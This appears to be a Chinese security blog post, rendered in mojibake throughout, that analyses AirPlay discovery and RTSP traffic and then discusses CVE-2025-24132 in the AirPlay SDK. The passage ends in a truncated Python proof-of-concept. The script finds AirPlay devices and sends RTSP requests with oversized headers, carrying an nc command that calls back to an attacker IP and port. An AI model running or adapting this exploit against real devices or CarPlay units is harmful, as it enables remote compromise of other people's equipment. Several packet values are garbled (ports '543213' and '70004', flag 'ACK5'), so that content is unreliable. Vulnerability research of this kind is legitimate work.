  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ä»¥å¤ªç½‘å±‚:</span><br><span class="line">  æºMAC: aa:bb:cc:dd:ee:ff (iPhone)</span><br><span class="line">  ç›®æ ‡MAC: 01:00:5E:00:00:FB (ç»„æ’­åœ°å€)</span><br><span class="line"></span><br><span class="line">IPå±‚:</span><br><span class="line">  æºIP: 192.168.1.100</span><br><span class="line">  ç›®æ ‡IP: 224.0.0.251 (mDNSç»„æ’­åœ°å€)</span><br><span class="line">  åè®®: UDP</span><br><span class="line"></span><br><span class="line">UDPå±‚:</span><br><span class="line">  æºç«¯å£: 5353</span><br><span class="line">  ç›®æ ‡ç«¯å£: 5353</span><br><span class="line"></span><br><span class="line">åº”ç”¨å±‚ (mDNS):</span><br><span class="line">  æŸ¥è¯¢ç±»å‹: PTR</span><br><span class="line">  æŸ¥è¯¢åç§°: _airplay._tcp.local</span><br><span class="line">  å«ä¹‰: &quot;è°æ”¯æŒ AirPlay æœåŠ¡ï¼Ÿ&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>è®¾å¤‡è¿›è¡Œå•æ’­å“åº”ï¼ˆå…¶å®airplay serverä¹Ÿä¼šä¸åœåœ°å‘å¤–å‘èµ·å¹¿æ’­ï¼Œå‘é€è‡ªå·±çš„è®¾å¤‡ä¿¡æ¯ï¼‰</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ä»¥å¤ªç½‘å±‚:</span><br><span class="line">  æºMAC: 11:22:33:44:55:66 (Apple TV)</span><br><span class="line">  ç›®æ ‡MAC: aa:bb:cc:dd:ee:ff (iPhone)</span><br><span class="line"></span><br><span class="line">IPå±‚:</span><br><span class="line">  æºIP: 192.168.1.200</span><br><span class="line">  ç›®æ ‡IP: 192.168.1.100 (å•æ’­å›å¤)</span><br><span class="line">  åè®®: UDP</span><br><span class="line"></span><br><span class="line">UDPå±‚:</span><br><span class="line">  æºç«¯å£: 5353</span><br><span class="line">  ç›®æ ‡ç«¯å£: 5353</span><br><span class="line"></span><br><span class="line">åº”ç”¨å±‚ (mDNS):</span><br><span class="line">  å“åº”ç±»å‹: PTR</span><br><span class="line">  æœåŠ¡åç§°: Living Room Apple TV._airplay._tcp.local</span><br><span class="line">  IPåœ°å€: 192.168.1.200</span><br><span class="line">  ç«¯å£: 7000</span><br><span class="line">  TXTè®°å½•: </span><br><span class="line">    - model=AppleTV6,2</span><br><span class="line">    - features=0x4A7FDFD5</span><br><span class="line">    - srcvers=220.68</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>TCPä¸‰æ¬¡æ¡æ‰‹ï¼ŒServerçš„7000ç«¯å£ä¸Šå»ºç«‹è¿æ¥ï¼ˆ<strong>è‹¹æœçš„åè®®å®¶æ—é‡Œé¢ï¼Œä¼šåœ¨TCP&#x2F;7000ç«¯å£ä¸Šé¢äº¤äº’åŒæ–¹çš„è®¾å¤‡ä¿¡æ¯&#x2F;æ§åˆ¶å‘½ä»¤ç­‰ç­‰ï¼Œç„¶ååœ¨å…¶ä»–ç«¯å£ä¸Šé¢ä¼ è¾“å®é™…çš„é€šä¿¡æ•°æ®</strong>ï¼‰</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ä»¥å¤ªç½‘å±‚:</span><br><span class="line">  æºMAC: aa:bb:cc:dd:ee:ff</span><br><span class="line">  ç›®æ ‡MAC: 11:22:33:44:55:66</span><br><span class="line"></span><br><span class="line">IPå±‚:</span><br><span class="line">  æºIP: 192.168.1.100</span><br><span class="line">  ç›®æ ‡IP: 192.168.1.200</span><br><span class="line"></span><br><span class="line">TCPå±‚:</span><br><span class="line">  æºç«¯å£: 54321</span><br><span class="line">  ç›®æ ‡ç«¯å£: 7000</span><br><span class="line">  æ ‡å¿—ä½: SYN</span><br><span class="line">  åºåˆ—å·: 1000</span><br></pre></td></tr></table></figure>

 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">TCPå±‚:</span><br><span class="line">  æºç«¯å£: 7000</span><br><span class="line">  ç›®æ ‡ç«¯å£: 54321</span><br><span class="line">  æ ‡å¿—ä½: SYN+ACK</span><br><span class="line">  åºåˆ—å·: 2000</span><br><span class="line">  ç¡®è®¤å·: 1001</span><br></pre></td></tr></table></figure>

 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">TCPå±‚:</span><br><span class="line">  æºç«¯å£: 543213  </span><br><span class="line">  ç›®æ ‡ç«¯å£: 70004  </span><br><span class="line">  æ ‡å¿—ä½: ACK5  </span><br><span class="line">  ç¡®è®¤å·: 2001</span><br></pre></td></tr></table></figure>
</li>
<li><p>AirPlayåè®®æ¡æ‰‹ï¼šç”¨æ¥æ§åˆ¶å¤šåª’ä½“å¯¹è¯ï¼Œæ§åˆ¶æš‚åœã€æ’­æ”¾ã€ä¼ è¾“æ ¼å¼ç­‰æ–¹é¢ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251120170134581.png" alt="image-20251120170134581"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251120165749893.png" alt="image-20251120165749893"></p>
<ul>
<li><p>iPhoneå‘èµ·RSTP OPTIONSè¯·æ±‚ï¼ˆä¸»è¦æ˜¯ç”¨æ¥æŸ¥è¯¢Serveræ”¯æŒä»€ä¹ˆæ ·çš„å‘½ä»¤ä¼ è¾“æ–¹å¼ï¼‰</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCPè¿æ¥: 192.168.1.100:54321 â†’ 192.168.1.200:7000</span><br><span class="line"></span><br><span class="line">åº”ç”¨å±‚æ•°æ®:</span><br><span class="line">OPTIONS * RTSP/1.0</span><br><span class="line">CSeq: 1</span><br><span class="line">User-Agent: AirPlay/220.68</span><br><span class="line">Client-Instance: FBED9A-6539-4E15-B95A-37A6D88</span><br></pre></td></tr></table></figure>
</li>
<li><p>Apple TVå›å¤RSTP OPTIONSå“åº”</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 1</span><br><span class="line">Public: SETUP, RECORD, PAUSE, FLUSH, TEARDOWN, OPTIONS, </span><br><span class="line">        GET_PARAMETER, SET_PARAMETER, POST, GET</span><br><span class="line">Server: AirTunes/220.68</span><br></pre></td></tr></table></figure>
</li>
<li><p>iPhoneå‘èµ·RSTP SETUPï¼Œè¯·æ±‚å»ºç«‹åª’ä½“æµ</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SETUP rtsp://192.168.1.200/stream RTSP/1.0</span><br><span class="line">CSeq: 2</span><br><span class="line">Transport: RTP/AVP/UDP;unicast;mode=record;control_port=6001;timing_port=6002</span><br></pre></td></tr></table></figure>
</li>
<li><p>åç»­æ­¥éª¤çœç•¥â€¦â€¦</p>
</li>
</ul>
</li>
<li><p>ä¼ è¾“éŸ³é¢‘&#x2F;è§†é¢‘çš„äºŒè¿›åˆ¶æ•°æ®</p>
<ul>
<li><p>é€šè¿‡RTPä¼ è¾“éŸ³é¢‘æ•°æ®</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">IPå±‚:</span><br><span class="line">  æºIP: 192.168.1.100</span><br><span class="line">  ç›®æ ‡IP: 192.168.1.200</span><br><span class="line">  åè®®: UDP</span><br><span class="line"></span><br><span class="line">UDPå±‚:</span><br><span class="line">  æºç«¯å£: éšæœº</span><br><span class="line">  ç›®æ ‡ç«¯å£: 6000</span><br><span class="line"></span><br><span class="line">åº”ç”¨å±‚ (RTP):</span><br><span class="line">  ç‰ˆæœ¬: 2</span><br><span class="line">  è½½è·ç±»å‹: 96 (åŠ¨æ€)</span><br><span class="line">  åºåˆ—å·: 12345</span><br><span class="line">  æ—¶é—´æˆ³: 160000</span><br><span class="line">  åŒæ­¥æºæ ‡è¯†: 0xABCDEF12</span><br><span class="line">  è½½è·æ•°æ®: [AACç¼–ç çš„éŸ³é¢‘æ•°æ®]</span><br></pre></td></tr></table></figure>
</li>
<li><p>åç»­æ­¥éª¤çœç•¥â€¦â€¦</p>
</li>
</ul>
</li>
</ol>
<h3 id="wiresharkæŠ“åŒ…"><a href="#wiresharkæŠ“åŒ…" class="headerlink" title="wiresharkæŠ“åŒ…"></a>wiresharkæŠ“åŒ…</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">==========================================================</span><br><span class="line">||	Client                                              ||</span><br><span class="line">||		- device: iphone                                ||</span><br><span class="line">||		- ipv4: 172.20.10.1                             ||</span><br><span class="line">||		- MAC: c6:ac:aa:16:d4:64                        ||</span><br><span class="line">||		- ipv6: 2408:8440:b500:a13:e96e:515:63c1:f416   ||</span><br><span class="line">||	                                                    ||</span><br><span class="line">||	Server                                              ||</span><br><span class="line">||		- device: Airserver for windows 5.7.2.0         ||</span><br><span class="line">||		- ipv4: 172.20.10.6                             ||</span><br><span class="line">||		- MAC: e0:0a:f6:a6:48:c7                        ||</span><br><span class="line">||		- ipv6: 2408:8440:b500:a13:94d9:8df9:f144:e718  || </span><br><span class="line">==========================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= mDNSæŸ¥è¯¢ =======================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= TCPä¸‰æ¬¡æ¡æ‰‹ =======================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server ======================= </span><br><span class="line">GET /info RTSP/1.0</span><br><span class="line">X-Apple-ProtocolVersion: 1</span><br><span class="line">Content-Length: 70</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 0</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00YqualifierZtxtAirPlay</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone ======================= </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 21 Nov 2025 09:20:01 GMT</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 210</span><br><span class="line"></span><br><span class="line">bplist00</span><br><span class="line">	</span><br><span class="line">_E1:0A:F6:A6:48:C7XdeviceIDR&#125;_XfeaturesQ4[statusFlagsZAppleTV3,2UmodelQ2RvvV220.68]sourceVersionSAPTTname_audioInputFormats/8=FHT_egjqpdateC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server ======================= </span><br><span class="line">POST /fp-setup RTSP/1.0</span><br><span class="line">X-Apple-ET: 32</span><br><span class="line">Content-Length: 16</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 1</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">FPLY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 1</span><br><span class="line">Content-Length: 142</span><br><span class="line"></span><br><span class="line">FPLYqA</span><br><span class="line">e&#x27;sQhw-?&gt;INNO`Lnz@IM8RecÂ…$Xn]\cZcdG</span><br><span class="line">Xy-2Sh;g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">POST /fp-setup RTSP/1.0</span><br><span class="line">X-Apple-ET: 32</span><br><span class="line">Content-Length: 164</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 2</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">FPLY$e2(&#125;^g=4W;2As]A2yT0 K(UUHVK4XL</span><br><span class="line">=m	LV7-@mQv&amp;~+/3c),QKg2Zr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 2</span><br><span class="line">Content-Length: 32</span><br><span class="line"></span><br><span class="line">FPLY),QKg2Zr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">SETUP rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 658</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 3</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00	</span><br><span class="line"></span><br><span class="line"> !&quot;#$Ret_updateSessionRequestSeiv[sessionUUID_statsCollectionEnabledVosName^timingProtocol^osBuildVersion]sourceVersionZtimingPort_isScreenMirroringSessionYosVersionTekey_sessionCorrelationUUIDXdeviceIDUmodelTnameZmacAddress O~jHyfgd&#x27;_$CCE84329-32C7-4825-842A-F352FA3554C9YiPhone OSSNTPX23C5027fW925.3.2O	T26.2OHFPLY&lt; NV&#x27;YbbIx;5RQP_$41C6E7A1-FC63-49CE-884A-A1AB9358308E_BA:7E:91:22:2A:CBZiPhone15,3e^eO`i_C6:AC:AA:16:D4:64/2IMYry(OPZ^gorsx	%(</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 77</span><br><span class="line">CSeq: 3</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line"></span><br><span class="line">bplist00YeventPort|ZtimingPort</span><br><span class="line">:Th(</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">GET /info RTSP/1.0</span><br><span class="line">X-Apple-ProtocolVersion: 1</span><br><span class="line">CSeq: 4</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 821</span><br><span class="line">CSeq: 4</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line"></span><br><span class="line">bplist00#$&amp;()+-.0:&lt;=%&#x27;</span><br><span class="line">*,</span><br><span class="line">/1;/R&#125;_XfeaturesSAPTTname	</span><br><span class="line">Xdisplays]widthPhysical	XrotationUwidth[widthPixels^heightPhysical8Vheight[overscanned\heightPixels_$4DA963C0-AA8F-4462-8EA9-694BC8B927C4Tuuid!dTtype_audioInputFormats_audioOutputFormats e&quot;f\audioFormatsRpiRvv[statusFlags_keepAliveLowPowerV220.68]sourceVersion_@355ce7d9bda3a97b18b91754287a2b26a680d64a56239a6ba8f813dd26415cc0Rpk_keepAliveSendStatsAsBody_E0:0A:F6:A6:48:C7XdeviceID2783564_outputLatencyMicrosWdefaultYaudioType_inputLatencyMicros356 4356&quot;9Umedia^audioLatenciesZAppleTV3,2UmodelZmacAddress).7;@BW`bpqz&#125;079@BORTWYey/7AV_hn&#125;:Th&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">GET_PARAMETER rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 8</span><br><span class="line">Content-Type: text/parameters</span><br><span class="line">CSeq: 5</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">volume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 5</span><br><span class="line">Content-Type: text/parameters</span><br><span class="line">Content-Length: 19</span><br><span class="line"></span><br><span class="line">volume: -0.000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">RECORD rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">CSeq: 6</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Audio-Latency: 0</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">SETUP rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 204</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 7</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00Wstreams]timestampInfoYlatencyMsTtype_streamConnectionID	</span><br><span class="line">TnameUSubSu</span><br><span class="line"></span><br><span class="line">UBePxT</span><br><span class="line">UAfPxT</span><br><span class="line">UBefEn</span><br><span class="line">UEmEncKn@9,6;PVY^dgmpvy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 85</span><br><span class="line">CSeq: 7</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line"></span><br><span class="line">bplist00WstreamsnTtypeXdataPort</span><br><span class="line">!$238-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">7100ç«¯å£ä¼ è¾“åª’ä½“æ•°æ®</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">TEARDOWN rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 69</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 58</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 58</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bplist00WstreamsTtypen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">TEARDOWN rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 42</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 59</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 59</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= TCPå››æ¬¡æŒ¥æ‰‹ =======================</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2025-24132"><a href="#CVE-2025-24132" class="headerlink" title="CVE-2025-24132"></a>CVE-2025-24132</h2><ol>
<li><p>CVE-2025-24132 æ¼æ´çš„æˆå› æ˜¯åŸºäºæ ˆçš„ç¼“å†²åŒºæº¢å‡ºï¼ˆstack-based buffer overflowï¼‰ï¼Œå‡ºç°åœ¨Apple AirPlay SDK å¤„ç†ç½‘ç»œæ•°æ®åŒ…çš„ä»£ç è·¯å¾„ä¸­ã€‚æ¼æ´ä½äºAirPlay SDKçš„ç½‘ç»œæ•°æ®è§£ææ¨¡å—ä¸­ï¼Œå…·ä½“æ˜¯åœ¨å¤„ç†æ¥è‡ªæœ¬åœ°ç½‘ç»œçš„AirPlayåè®®æ•°æ®åŒ…æ—¶ï¼Œæœªèƒ½æ­£ç¡®éªŒè¯è¾“å…¥æ•°æ®çš„é•¿åº¦ï¼Œå¯¼è‡´æ ˆç¼“å†²åŒºè¢«æº¢å‡ºè¦†ç›–ã€‚éœ€è¦æµ‹è¯•äººå‘˜å’Œç›®æ ‡ç³»ç»Ÿä½äºåŒä¸€ä¸ªå±€åŸŸç½‘ï¼ˆèƒ½å¤Ÿç›¸äº’é€šä¿¡å°±å¥½ï¼‰ã€‚è¿„ä»Šä¸ºæ­¢ï¼ˆ2025å¹´11æœˆ25æ—¥ï¼‰ï¼Œæ²¡èƒ½æ‰¾åˆ°å¯ä»¥æˆåŠŸå¤ç°æ¼æ´çš„PoCä»¥åŠexpï¼ŒYouTuBeä¸Šé¢è¯¥æ¼æ´çš„æäº¤è€…æ¼”ç¤ºäº†åˆ©ç”¨è¿‡ç¨‹ï¼Œä½†ä»ç„¶æ²¡æœ‰å…¬å¼€PoCã€‚</p>
</li>
<li><p>å½±å“çš„èŒƒå›´</p>
<ul>
<li>Airplay éŸ³é¢‘SDKï¼š&lt;2.7.1</li>
<li>Airplay è§†é¢‘SDKï¼š&lt;3.6.0</li>
<li>Carplayé€šä¿¡SDKï¼š&lt;R18.1</li>
</ul>
</li>
<li><p>ä¸ºä»€ä¹ˆCarplayä¼šå—åˆ°å½±å“</p>
<ul>
<li>Carplayçš„æ— çº¿é€šä¿¡æœºåˆ¶åº•å±‚ä¾èµ–AirPlayåè®®æ ˆï¼Œå†…éƒ¨é›†æˆäº†AirPlay SDKï¼Œè€Œè¯¥æ¼æ´ä½äºAirPlay SDKçš„ç½‘ç»œæ•°æ®è§£ææ¨¡å—ä¸­ï¼›</li>
<li>åˆ©ç”¨CVE-2025-24132æ”»å‡»Carplayï¼šé€šè¿‡iAP2åè®®è¿æ¥ä¸Šè½¦æœºå¹¶è‡ªåŠ¨äº¤äº’WiFiå‡­è¯ï¼ˆè“ç‰™é“¾è·¯ï¼‰ -&gt; è„šæœ¬æ”»å‡»ï¼ˆWiFié“¾è·¯ï¼‰</li>
</ul>
</li>
<li><p>ç½‘ç»œå—…æ¢åˆ†æç‰ˆæœ¬</p>
<ul>
<li>wiresharkæŠ“å–7000ç«¯å£çš„æµé‡ï¼štcp.port&#x3D;&#x3D;7000</li>
<li>æ‰¾åˆ°å‘å¾€tcp&#x2F;7000çš„æ•°æ®åŒ…ï¼Œåœ¨User-Agentå­—æ®µä¸­å¤§æ¦‚ç‡ä¼šå‡ºç°â€œAirplay&#x2F;xx.xx.xxâ€çš„åè®®ç‰ˆæœ¬å·ï¼ˆéæ ‡å‡†è½¯ä»¶å¯èƒ½ä¼šè¿›è¡Œä¿®æ”¹ï¼‰</li>
</ul>
</li>
<li><p>airplayåè®®ç‰ˆæœ¬&amp;airplay SDKå¯¹åº”å…³ç³»</p>
<table>
<thead>
<tr>
<th>åè®®ç‰ˆæœ¬ï¼ˆæŠ“åŒ… User-Agentï¼‰</th>
<th>SDK ç‰ˆæœ¬ï¼ˆMFi å†…éƒ¨ï¼‰</th>
</tr>
</thead>
<tbody><tr>
<td>AirPlay&#x2F;210.x</td>
<td>AirPlay Audio SDK &lt; 2.7.1</td>
</tr>
<tr>
<td>AirPlay&#x2F;220.x</td>
<td>AirPlay Audio SDK â‰¥ 2.7.1</td>
</tr>
<tr>
<td>AirPlay&#x2F;310.x</td>
<td>AirPlay Video SDK &lt; 3.6.0.126</td>
</tr>
<tr>
<td>AirPlay&#x2F;320.x</td>
<td>AirPlay Video SDK â‰¥ 3.6.0.126</td>
</tr>
<tr>
<td>AirPlay&#x2F;420.x</td>
<td>AirPlay Video SDK 3.8+</td>
</tr>
</tbody></table>
</li>
<li><p>PoCæ ·ä¾‹ï¼ˆæœªèƒ½æ‰¾åˆ°åˆé€‚çš„ç›®æ ‡éªŒè¯æœ‰æ•ˆæ€§ï¼Œä»…ä½œå‚è€ƒï¼‰</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">A PoC script for CVE-2025-24132 is made by shaoxinSEC 25/11/2025.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> ifaddr</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, sys, socket, time, ipaddress</span><br><span class="line"><span class="keyword">from</span> zeroconf <span class="keyword">import</span> Zeroconf, ServiceBrowser, ServiceInfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------- é…ç½® ----------</span></span><br><span class="line">OVERFLOW_SIZES = [<span class="number">0x1200</span>, <span class="number">0x2000</span>]   <span class="comment"># 4608 &amp; 8192</span></span><br><span class="line">LISTEN_ADDR = <span class="string">&quot;172.20.10.6&quot;</span>         <span class="comment"># æ”»å‡»æœºIPï¼ˆå°è¯•ncå¤–å¸¦å‘½ä»¤ï¼‰</span></span><br><span class="line">LISTEN_PORT    = <span class="number">4445</span>               <span class="comment"># æ”»å‡»æœºPORT</span></span><br><span class="line">TIMEOUT        = <span class="number">3</span></span><br><span class="line"><span class="comment"># -------------------------</span></span><br><span class="line"></span><br><span class="line">airplay_devices = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AirPlayListener</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remove_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">        info = zc.get_service_info(type_, name)</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            addr  = socket.inet_ntoa(info.addresses[<span class="number">0</span>])</span><br><span class="line">            port  = info.port</span><br><span class="line">            props = &#123;k.decode().lower(): v.decode() <span class="keyword">for</span> k, v <span class="keyword">in</span> info.properties.items()&#125;</span><br><span class="line">            airplay_devices.append(&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: name.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>],</span><br><span class="line">                <span class="string">&#x27;ip&#x27;</span>: addr,</span><br><span class="line">                <span class="string">&#x27;port&#x27;</span>: port,</span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: props.get(<span class="string">&#x27;model&#x27;</span>, <span class="string">&#x27;Unknown&#x27;</span>),</span><br><span class="line">                <span class="string">&#x27;features&#x27;</span>: props.get(<span class="string">&#x27;features&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            &#125;)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_port</span>(<span class="params">ip, port, timeout=<span class="number">2</span></span>):</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.settimeout(timeout)</span><br><span class="line">        <span class="keyword">return</span> s.connect_ex((ip, port)) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crash_target</span>(<span class="params">ip, port, size</span>):</span><br><span class="line">    cmd  = <span class="string">f&quot;echo CVE-2025-24132|nc <span class="subst">&#123;LISTEN_ADDR&#125;</span> <span class="subst">&#123;LISTEN_PORT&#125;</span>\n&quot;</span></span><br><span class="line">    pkt = (</span><br><span class="line">        <span class="string">f&quot;SETUP rtsp://<span class="subst">&#123;ip&#125;</span>/airplay RTSP/1.0\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;CSeq: 1\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Session-ID: <span class="subst">&#123;<span class="string">&#x27;A&#x27;</span>*size&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Authorization: Basic <span class="subst">&#123;<span class="string">&#x27;B&#x27;</span>*<span 